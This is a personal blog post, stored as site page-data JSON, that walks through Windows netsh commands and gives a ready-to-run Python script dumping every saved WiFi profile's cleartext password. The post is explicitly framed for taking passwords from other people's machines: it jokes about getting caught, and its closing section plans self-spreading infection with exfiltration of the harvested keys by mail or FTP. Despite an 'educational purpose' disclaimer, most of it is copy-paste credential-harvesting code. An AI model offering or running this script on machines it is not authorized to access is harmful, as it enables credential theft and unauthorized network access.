{"componentChunkName":"component---src-templates-blog-post-js","path":"/extract-wifi-passwords/","result":{"data":{"site":{"siteMetadata":{"title":"Blogs by JaiD"}},"markdownRemark":{"id":"cae4ba84-c3be-56b4-8f87-53021121aa9b","excerpt":"Before starting anything I just wanna say (obligatory), This is all for educational purpose and shouldn't be used for harming anyone Also that this can easily‚Ä¶","html":"<p>Before starting anything I just wanna say (obligatory), <strong>This is all for educational purpose and shouldn't be used for harming anyone</strong></p>\n<p>Also that this can easily be done in any language that allows you to execute commands on the terminal. So let's see how this can be done on the terminal then we will see how we can automate this via python.</p>\n<h2>Open a Terminal</h2>\n<p>Press <code class=\"language-text\">Win + R</code> and type <code class=\"language-text\">cmd</code> in the input box next to <code class=\"language-text\">run: </code> and press enter</p>\n<p><img src=\"./images/Zero.jpg\" alt=\"\"></p>\n<h2>Show all the saved profiles in your system</h2>\n<p>Type <code class=\"language-text\">netsh wlan show profiles</code> and press enter. This should show all the Wifi Profiles saved on your system</p>\n<p><img src=\"./images/One.jpg\" alt=\"\"></p>\n<h2>Details about a specific WiFi Profile</h2>\n<p>Enter <code class=\"language-text\">netsh wlan show profile &lt;profile></code> and replacing <code class=\"language-text\">&lt;profile></code> with the name of the profile you want to get details about</p>\n<p><img src=\"./images/Two.jpg\" alt=\"\"></p>\n<p>You can see <code class=\"language-text\">Security key: Present</code> in the <code class=\"language-text\">Security Settings</code> Section but it isn't showing the password. For that, we will have to pass in a parameter of <code class=\"language-text\">key=clear</code>.</p>\n<h2>So let's try this again</h2>\n<p><code class=\"language-text\">netsh wlan show profile &lt;profile> key=clear</code></p>\n<p>And voila ü•≥üéä We have the password in the <code class=\"language-text\">Key Content</code> Field just below <code class=\"language-text\">Security key: Present</code>\n<img src=\"./images/Three.jpg\" alt=\"\"></p>\n<p>The problem you can see here is that you will have to run this statement for each WiFi Profile and it might take some time to do this manually. Might just be the difference between you walking away with all passwords or getting caught in the act xD</p>\n<h1>Now let's automate this</h1>\n<p>I chose python because I am comfortable with it and have experience with executing instructions on the shell line via python but you can do the same with any language which allows you to execute commands on cmd and the output back.</p>\n<h2>How to execute a command on the shell from python</h2>\n<p>We could have used the <code class=\"language-text\">system()</code> method of the <code class=\"language-text\">os</code> module but the problem with that is that it runs the commands and prints the output directly on the stdout pipeline and there is no straight way to capture the output in a variable(as far as I know). So I'll be using the <code class=\"language-text\">check_output()</code> method of the <code class=\"language-text\">subprocess</code> module which takes in a list representing the command and returns the output after running the command as bytes.</p>\n<h2>Running commands and formating output</h2>\n<p>Let's see how we can use this to run <code class=\"language-text\">netsh wlan show profiles</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">import subprocess\noutput = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']) </code></pre></div>\n<p>And if we try printing <code class=\"language-text\">output</code>, it should look something like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">b'\\r\\nProfiles on interface Wi-Fi:\\r\\n\\r\\nGroup policy profiles (read only)\\r\\n---------------------------------\\r\\n    &lt;None>\\r\\n\\r\\nUser profiles\\r\\n-------------\\r\\n    All User Profile     : JioFiber-5G\\r\\n    All User Profile     : JioFiber\\r\\n    All User Profile     : Blablabla 2\\r\\n   \n All User Profile     : Jaya\\r\\n    All User Profile     : 5G_Home\\r\\n    All User Profile     : 0E278461867E5885A4F8E790D14D056E 2\\r\\n    All User Profile     : Jio-2_4G\\r\\n    All User Profile     : Blablabla\\r\\n    All User Profile     : Jio5G\\r\\n    All User Profile     : 0E278461867E5885A4F8E790D14D056E\\r\\n    All User Profile     : Le pakad\\r\\n\\r\\n'</code></pre></div>\n<br>\n<blockquote>\n<p><strong>NOTE:</strong> You might get <code class=\"language-text\">\\n</code> only instead of <code class=\"language-text\">\\r\\n</code> depending on which OS you are running this on. This is because DOS and Unix represent linebreak in different ways which are being carried to windows and Linux(why?). This can be a whole blog in itself üòÇ</p>\n</blockquote>\n<p>Next, we should decode this string to <code class=\"language-text\">utf-8</code> and split it into different strings, and extract all the important information, a.k.a. Wifi profiles</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">data = output.decode('utf-8').split('\\n')\nprofiles = []\nfor d in data:\n    if \"All User\" in d:\n        profiles.append(d.split(\":\")[1].replace('\\r','').strip())</code></pre></div>\n<p>Now we should have all the profiles in a nice concise list</p>\n<h2>Extracting Passwords for each profile</h2>\n<p>All we got to do now is loop over profiles and execute the same command for each profile, format the data and extract what's important for us. PASSWORDS (insert evil noise)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">gold = [] \nfor profile in profiles: \n    command = [\"netsh\", \"wlan\", \"show\", \"profile\", profile, \"key=clear\"]\n    output = subprocess.check_output(command)\n    data = output.decode('utf-8').split('\\n')\n    for d in data:\n        if \"Key Content\" in d:\n            password = d.split(\":\")[1].replace('\\r','').strip()\n            gold.append([profile,password])</code></pre></div>\n<p>And at last, drum rolls, please ü•Åü•Å</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">for g in gold:\n    print(\"Username: \" +g[0] + \"\\nPassword: \" + g[1])\n    print(\"------------------\")</code></pre></div>\n<p>I am sorry but I can't show you my output üòú but here is a representation of how it should look</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Username: ABCD\nPassword: password\n------------------\nUsername: Lock\nPassword: key\n------------------\nUsername: Safe\nPassword: verysafe\n</code></pre></div>\n<h1>What you want to copy-paste</h1>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">import subprocess\noutput = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']) \n\ndata = output.decode('utf-8').split('\\n')\nprofiles = []\nfor d in data:\n    if \"All User\" in d:\n        profiles.append(d.split(\":\")[1].replace('\\r','').strip())\n\ngold = [] \nfor profile in profiles: \n    command = [\"netsh\", \"wlan\", \"show\", \"profile\", profile, \"key=clear\"]\n    output = subprocess.check_output(command)\n    data = output.decode('utf-8').split('\\n')\n    for d in data:\n        if \"Key Content\" in d:\n            password = d.split(\":\")[1].replace('\\r','').strip()\n            gold.append([profile,password])\n\nfor g in gold:\n    print(\"Username: \" +g[0] + \"\\nPassword: \" + g[1])\n    print(\"------------------\")</code></pre></div>\n<h1>Conclusion</h1>\n<p>We learned about the <code class=\"language-text\">netsh</code> command on a shell which can be used to view all saved Wifi profiles and also how we can view information about a specific Wifi profile and we got to know how we can add pass an additional parameter to view the saved password, and at the end, we automated this whole process using python. Remember you can automate using any language with allows you to execute commands on a shell and read the output.</p>\n<h1>Next Step</h1>\n<p>Ideas must be going left and right how you can execute this script on your neighbors and get their wifi and live the rest of your life for free, well ME TOO. So I am thinking of automating this to an extent that this script should infect the system on its own and extract the passwords and then send them to you via mail or an FTP server so that you don't even need to visit your neighbors.     Covid you know ü§∑üèª‚Äç‚ôÇüòÇ</p>\n<p>Follow me out on twitter <a href=\"https://twitter.com/jai_dewani\">@jai_dewani</a> if you wanna an update whenever I decide to post the next part üòâ</p>","frontmatter":{"title":"How to extract all WiFi Passwords with a single python script","date":"February 07, 2021","description":"Did you know that all the Wifi Passwords you type in a windows machine are stored locally and you can extract them all with just a few lines on command line. What's better is this can be automated by using python which allows us to exectue execute intructions on command line. Let's see how we can this as well "}},"previous":{"fields":{"slug":"/windows-file-structure/"},"frontmatter":{"title":"Windows file explorer being overprotective"}},"next":{"fields":{"slug":"/one-stop-solution-to-sharing-your-resume/"},"frontmatter":{"title":"Your one stop solution to sharing your resume with everyone"}}},"pageContext":{"id":"cae4ba84-c3be-56b4-8f87-53021121aa9b","previousPostId":"994b9113-b863-543d-8ef5-503f5393b292","nextPostId":"9383e0a1-b1ad-51fc-874a-b732833087ea"}},"staticQueryHashes":["2841359383","3257411868"],"slicesMap":{}}